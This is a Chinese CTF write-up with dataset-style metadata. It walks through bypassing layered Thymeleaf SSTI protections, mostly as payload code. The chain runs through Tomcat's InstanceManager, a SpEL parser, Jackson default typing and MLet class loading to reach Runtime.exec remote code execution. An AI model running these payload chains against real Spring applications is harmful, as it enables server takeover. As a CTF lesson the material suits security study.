---
title: ssti 挑战——wp
contest: ssti-challenge
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [thymeleaf-ssti, s2-061, instance-manager, spel, jackson-defaulttyping, mlet, classloader]
attack_chain:
  - Thymeleaf 3 阻断 `$$` 和 `new`
  - 借鉴 S2-061 拿 org.apache.tomcat.InstanceManager
  - @servletContext.getAttribute('org.apache.tomcat.InstanceManager')
  - newInstance('SpelExpressionParser') 创建 SpEL
  - Jackson ObjectMapper enableDefaultTyping
  - constructFromCanonical 创建 JavaType
  - MLet 远程加载恶意 class
  - SpEL 表达式 Runtime.exec
key_payload: S2-061 InstanceManager + Jackson + SpEL + MLet
one_liner: Thymeleaf SSTI 3 层防护绕过，S2-061 + Jackson + SpEL 完整利用链。
lesson: 当 SSTI 阻断 `$$` 和 `new` 时，可以借助 InstanceManager 实例化类。
quality: high
---

Thymeleaf SSTI 3 层防护绕过的完整 WP（来源 ctfiot）。

**3 层防护**
1. 不让用 `$$`
2. 不让用 `new`
3. 最新版 Thymeleaf 封堵 T() 和 Class.forName()

**借鉴 S2-061**：从 ognl 内置对象 application 拿 `org.apache.tomcat.InstanceManager`

**两个等价方法**
```java
@servletContext.getAttribute('org.apache.tomcat.InstanceManager')
#ctx.getExchange().getApplication().getAttributeValue("org.apache.tomcat.InstanceManager")
```

**payload 链**

```java
// 1. 调多次小技巧
__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write("qqq"))}|__::.

// 2. 注册临时变量
__|$*{
  @servletContext.setAttribute("p",@servletContext.getAttribute("org.apache.tomcat.InstanceManager")
    .newInstance("org.springframework.expression.spel.standard.SpelExpressionParser"))
}|__::.

__|$*{
  @servletContext.setAttribute("spel","new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ping 127.0.0.1').getInputStream()).useDelimiter('\\A').next()")
}|__::.

__|$*{
  @servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()
}|__::.

__|$*{
  qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),
       #w.flush(),
       #w.write(@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()))
}|__::.
```

**Jackson ObjectMapper 替代方案**
```java
@resourceHandlerMapping.urlMap.getClass()

// 用 Jackson 反序列化
__|$*{
  @jacksonObjectMapper.enableDefaultTyping()
}|__::.
__|$*{
  @servletContext.setAttribute("javatype",@jacksonObjectMapper.getTypeFactory()
    .constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"))
}|__::.
__|$*{
  @servletContext.setAttribute("parser",@jacksonObjectMapper.readValue("{}",@servletContext.getAttribute("javatype")))
}|__::.
__|$*{
  @servletContext.getAttribute("parser").parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')").getValue()
}|__::.
```

**MLet 远程加载**
```
username=__|$*{
  @jacksonObjectMapper.readValue("{}",
    @jacksonObjectMapper.getTypeFactory()
      .findClass("org.springframework.expression.spel.standard.SpelExpressionParser"))
    .parseExpression(#ctx.getExchange().getNativeRequestObject().getParameter('a'))
    .getValue()
}|__::.&a=T(org.springframework.cglib.core.ReflectUtils).defineClass('payload.SpringEcho',
  T(org.springframework.util.Base64Utils).decodeFromString('yv66vg...'),
  new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()
```

**关键技巧**：
- 多次小请求 + 注册临时变量（避免单次 payload 过长）
- 利用 InstanceManager.newInstance 绕过 `new` 限制
- SpEL 字符串拼接 + URL 编码绕关键字
- MLet 加载远程 class 拿 RCE

适合作为"现代 Java Web SSTI 高级利用"教学案例。
